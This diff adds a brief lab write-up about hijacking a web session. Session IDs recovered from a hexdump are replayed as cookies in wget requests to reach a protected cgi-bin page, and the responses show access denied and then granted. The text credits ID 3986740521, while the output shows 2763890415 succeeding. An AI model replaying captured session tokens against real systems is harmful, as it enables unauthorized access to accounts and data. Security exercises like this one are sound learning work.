@@ -1,0 +1,26 @@
+Searching session ID's in the hexdump data i found the following ids:
+
+[2763890415, 3986740521, ]
+
+Further searching with different regex filter strings i found that the website
+contained a page in cgi-bin names secret.py. Using the hijacked sessionid
+3986740521, i could display the webpage. Even though the webpage is forbidden
+when using a plain GET request:
+
+
+
+wget -qO- https://145.100.132.31:9876/cgi-bin/secret.py --no-check-certificate
+output:
+    <h1>ACCESS DENIED</h1>
+
+wget -qO- https://145.100.132.31:9876/cgi-bin/secret.py
+    --header='Cookie: SESSIONID=3986740521' --no-check-certificate
+output:
+    <h1>ACCESS DENIED</h1>
+
+wget -qO- https://145.100.132.31:9876/cgi-bin/secret.py
+    --header='Cookie: SESSIONID=2763890415' --no-check-certificate
+output:
+    <h1>ACCESS GRANTED</h1>
+    Welcome back, Secretary of Defense.<br/>
+    Your secret code is: 3986740521.</br>
